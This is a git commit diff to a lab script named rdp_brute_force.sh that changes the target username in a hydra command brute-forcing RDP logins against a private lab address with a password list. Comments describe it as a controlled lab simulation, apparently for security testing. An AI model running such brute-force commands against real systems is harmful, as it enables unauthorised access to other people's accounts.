30e671dc018b57f5ee9e804e89b98087fac1bbbb
Harsh <191388192+harshhhhh10@users.noreply.github.com>
2026-05-19 17:35:27 +0530

    Change username for RDP brute force script

--- scripts/rdp_brute_force.sh
+++ scripts/rdp_brute_force.sh
@@ -8,4 +8,4 @@ echo "[*] Simulating controlled RDP Brute Force attack..."
 # Exact command executed in the local lab environment:
 # -t 4 limits parallel connections to ensure RDP service stability
 # -f terminates execution immediately upon finding the first valid credential pair
-hydra -t 4 -V -f -l Administrator -P bad_passwords.txt rdp://10.0.2.15
+hydra -t 4 -V -f -l testing -P bad_passwords.txt rdp://10.0.2.15
